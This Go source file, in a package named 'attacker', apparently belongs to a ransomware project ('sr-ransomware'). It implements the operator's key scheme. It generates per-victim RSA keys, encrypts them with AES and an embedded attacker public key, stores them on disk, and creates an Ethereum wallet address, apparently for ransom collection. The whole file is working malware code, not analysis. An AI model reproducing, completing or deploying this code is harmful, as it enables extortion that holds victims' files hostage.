package attacker

import (
    "os"
    "unsafe"
    "runtime"
    "io/ioutil"
    "crypto/aes"
    "crypto/rsa"
    "crypto/rand"
    "crypto/cipher"
    "path/filepath"

    "github.com/sug0/sr-ransomware/go/errors"
    "github.com/sug0/sr-ransomware/go/crypto/util"
    ethereum "github.com/ethereum/go-ethereum/crypto"
)

//go:generate go run generate/key.go

type Scheme struct {
    key  *rsa.PublicKey
    path string
}

type Keys struct {
    Wallet string
    Public []byte
    Secret []byte
}

type slice struct {
    Data uintptr
    Len  int
    Cap  int
}

func NewScheme() *Scheme {
    path := os.Getenv("FLUPATH")
    if path != "" {
        return NewSchemeWithPath(path)
    }
    if runtime.GOOS == "windows" {
        return NewSchemeWithPath(os.Getenv("TMP"))
    }
    return NewSchemeWithPath("/tmp")
}

func NewSchemeWithPath(path string) *Scheme {
    pk, _ := util.ImportDERPublicKeyRSA(oraclePublicKey)
    return &Scheme{key: pk, path: filepath.Clean(path)}
}

func (s *Scheme) GenerateAndStoreKeys() (*Keys, error) {
    // generate the keys
    sk, err := util.GenerateKeyRSA(rsaKeyBits)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to generate RSA secret key", err)
    }
    aesIVKey, err := util.GenerateIVandKeyAES()
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to generate AES", err)
    }
    eth, err := ethereum.GenerateKey()
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to generate ETH key", err)
    }

    // export public key
    pkData, err := util.ExportDERPublicKeyRSA(&sk.PublicKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to marshal RSA public key", err)
    }

    // export and encrypt secret key
    skData, err := util.ExportDERSecretKeyRSA(sk)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to marshal RSA secret key", err)
    }
    skData = util.Pad(skData, aes.BlockSize)

    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
    aesCiph := cipher.NewCTR(aesBlock, aesIVKey[:16])

    aesCiph.XORKeyStream(skData, skData)

    // encrypt aes key and nonce
    aesEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, s.key, aesIVKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to encrypt AES key", err)
    }

    // encrypt eth key
    ethEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, s.key, ethereum.FromECDSA(eth))
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to encrypt ETH key", err)
    }

    // calc hash digest of public key
    ds := util.Sha1Digest(pkData)

    // create directory for keys
    err = os.Mkdir(filepath.Join(s.path, ds), os.ModePerm)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to create dir", err)
    }

    // write aes and eth keys
    wallet := ethereum.PubkeyToAddress(eth.PublicKey).Hex()
    walletBytes := *(*[]byte)(unsafe.Pointer(&slice{
        Data: ((*slice)(unsafe.Pointer(&wallet))).Data,
        Len: len(wallet),
        Cap: len(wallet),
    }))

    err = ioutil.WriteFile(filepath.Join(s.path, ds, "aes"), aesEncrypted, 0600)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to save AES key", err)
    }
    err = ioutil.WriteFile(filepath.Join(s.path, ds, "eth"), ethEncrypted, 0600)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to save ETH key", err)
    }
    err = ioutil.WriteFile(filepath.Join(s.path, ds, "add"), walletBytes, 0600)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to save ETH address", err)
    }

    return &Keys{wallet, pkData, skData}, nil
}
